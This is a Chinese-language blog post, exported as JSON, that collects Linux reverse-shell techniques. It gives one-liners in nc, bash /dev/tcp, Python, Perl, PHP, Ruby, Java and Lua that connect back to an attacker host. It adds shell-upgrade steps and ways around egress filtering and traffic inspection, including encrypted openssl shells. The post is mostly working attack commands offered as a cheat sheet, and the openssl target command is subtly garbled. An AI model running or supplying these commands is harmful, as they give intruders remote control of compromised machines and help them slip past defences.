{"title":"2019-03-25-Linux反弹shell的一些方法","slug":"2019-03-25-Linux反弹shell的一些方法","date":"2019-10-17T14:44:49.000Z","updated":"2019-10-17T15:43:03.507Z","comments":true,"excerpt":"","content":"<blockquote>\n<p>Linux反弹shell方法的一些总结</p>\n</blockquote>\n<h5 id=\"NC\"><a href=\"#NC\" class=\"headerlink\" title=\"NC\"></a>NC</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc 192.168.1.2 8080 -t -e /bin/bash</span><br></pre></td></tr></table></figure>\n<h5 id=\"Bash\"><a href=\"#Bash\" class=\"headerlink\" title=\"Bash\"></a>Bash</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/192.168.1.2/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<h5 id=\"Python\"><a href=\"#Python\" class=\"headerlink\" title=\"Python\"></a>Python</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.2\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"Perl\"><a href=\"#Perl\" class=\"headerlink\" title=\"Perl\"></a>Perl</h5><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e <span class=\"string\">'use Socket;$i=\"192.168.1.2\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"php\"><a href=\"#php\" class=\"headerlink\" title=\"php\"></a>php</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"192.168.1.2\",8080);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"ruby\"><a href=\"#ruby\" class=\"headerlink\" title=\"ruby\"></a>ruby</h5><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ruby -rsocket -e<span class=\"string\">'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"java\"><a href=\"#java\" class=\"headerlink\" title=\"java\"></a>java</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r = Runtime.getRuntime()</span><br><span class=\"line\">p = r.exec([<span class=\"string\">\"/bin/bash\"</span>,<span class=\"string\">\"-c\"</span>,<span class=\"string\">\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"</span>] as String[])</span><br><span class=\"line\">p.waitFor()</span><br></pre></td></tr></table></figure>\n<h5 id=\"Lua\"><a href=\"#Lua\" class=\"headerlink\" title=\"Lua\"></a>Lua</h5><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lua -e <span class=\"string\">\"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\"</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"反弹成功获取交互式shell\"><a href=\"#反弹成功获取交互式shell\" class=\"headerlink\" title=\"反弹成功获取交互式shell\"></a>反弹成功获取交互式shell</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.python -c &apos;import pty;pty.spawn(&quot;/bin/nash&quot;)&apos;</span><br><span class=\"line\">2.输入ctrl-z，输入执行：stty raw -echo ; fg</span><br><span class=\"line\">3.ctrl-l，执行：reset ； export SHELL=bash ; export TERM=xterm-256color ; stty rows 54 columns</span><br></pre></td></tr></table></figure>\n<h5 id=\"反弹shell失败的几种常见原因\"><a href=\"#反弹shell失败的几种常见原因\" class=\"headerlink\" title=\"反弹shell失败的几种常见原因\"></a>反弹shell失败的几种常见原因</h5><h6 id=\"nc不支持-e参数\"><a href=\"#nc不支持-e参数\" class=\"headerlink\" title=\"nc不支持-e参数\"></a>nc不支持-e参数</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class=\"line\">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>\n<h6 id=\"禁止出口流量\"><a href=\"#禁止出口流量\" class=\"headerlink\" title=\"禁止出口流量\"></a>禁止出口流量</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.目标执行ping，获取实际包大小：ping -s64 -c1 192.168.1.2      （系统发送的字节，假如118）</span><br><span class=\"line\">2.vps监控icmp日志：tcpdump -i eth0 -n -v icmp | grep -i &quot;length 118&quot;</span><br><span class=\"line\">3.再次ping -s64 -c1 192.168.1.2</span><br><span class=\"line\">4.vps上查看118字节的数据包</span><br></pre></td></tr></table></figure>\n<h6 id=\"限制向外访问端口\"><a href=\"#限制向外访问端口\" class=\"headerlink\" title=\"限制向外访问端口\"></a>限制向外访问端口</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.采用白名单或者黑名单限制方法</span><br><span class=\"line\">2.监听999端口，访问该端口http服务，vps没http记录，则为白名单过滤</span><br><span class=\"line\">3.解决方案，采用常规端口，如21，22，23，80，443</span><br></pre></td></tr></table></figure>\n<h6 id=\"流量审查\"><a href=\"#流量审查\" class=\"headerlink\" title=\"流量审查\"></a>流量审查</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.通过openssl加密流量</span><br><span class=\"line\">2.vps生成SSL证书公钥/私钥：openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class=\"line\">3.vps监听反弹shell：openssl s_server -quiet -key.pem -cert cer.pem -port 443</span><br><span class=\"line\">4.目标上openssl加密流量：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|openssl s_server -quiet -key.pem -cert cer.pem -port 443 &gt;/tmp/f</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":[]}